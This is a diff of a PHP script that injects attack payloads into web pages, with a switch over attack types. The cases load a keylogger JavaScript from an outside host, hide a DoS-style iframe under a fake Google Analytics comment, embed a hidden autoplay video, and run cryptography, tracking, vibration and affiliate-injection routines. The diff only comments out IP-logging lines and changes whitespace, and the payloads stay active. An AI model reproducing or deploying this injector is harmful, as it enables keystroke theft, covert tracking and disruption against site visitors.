@@ -9,12 +9,12 @@ switch($typeOfAttack){
           $keyloggerscript = "http://stme.esy.es/js/keylogger.js";
           $textToInsert="<script type='text/javascript' src='$keyloggerscript'</script>";
           //GETTING IP AND ADDING IT TO DATA.TXT ON SERVER
-          $ip = getenv('HTTP_CLIENT_IP')?:
-          getenv('HTTP_X_FORWARDED_FOR')?:
-          getenv('HTTP_X_FORWARDED')?:
-          getenv('HTTP_FORWARDED_FOR')?:
-          getenv('HTTP_FORWARDED')?:
-          getenv('REMOTE_ADDR');
+//          $ip = getenv('HTTP_CLIENT_IP')?:
+//          getenv('HTTP_X_FORWARDED_FOR')?:
+//          getenv('HTTP_X_FORWARDED')?:
+//          getenv('HTTP_FORWARDED_FOR')?:
+//          getenv('HTTP_FORWARDED')?:
+//          getenv('REMOTE_ADDR');
           //depends on location / this ip for good result 12.215.42.19 ;
 //           $data = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true")." Says <br>";
 //           $logfile = fopen('../php/data.txt', 'a+');
@@ -23,7 +23,7 @@ switch($typeOfAttack){
           runScript($textToInsert);
           break;
     case "Dos":
-          $textToInsert="<!-- Google Analytics -->
+$textToInsert="<!-- Google Analytics -->
 <script>
 window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
 ga('create', 'UA-XXXXX-Y', 'auto');
@@ -33,18 +33,14 @@ ga('send', 'pageview');
 <!-- End Google Analytics --><iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
           //for($i=0;$i<10;i++){$textToInsert .= $textToInsert};
           runScript($textToInsert);
-            
-
           break;
-    case "RickRoll":
         
+    case "RickRoll":
           $textToInsert="<iframe width='0' height='0' src='https://www.youtube.com/embed/07n4hliWkNs?autoplay1' frameborder='0'></iframe>";
           runScript($textToInsert);
-
           break;
 
     case "Cryptography":
-        
           runCryptographyScript($privateKey);
           break;
 
@@ -53,6 +49,7 @@ ga('send', 'pageview');
           $textToInsert="<script type='text/javascript' src='$TrackingScript'></script>";
           runScript($textToInsert);
           break;
+        
     case "Vibration":
           $textToInsert =  "<script type='text/javascript'>
             navigator.vibrate = navigator.vibrate ||
@@ -64,6 +61,7 @@ ga('send', 'pageview');
             </script>";
             runScript($textToInsert);
           break;
+        
     case "Affliate":
         runAffliateScript();
         break;
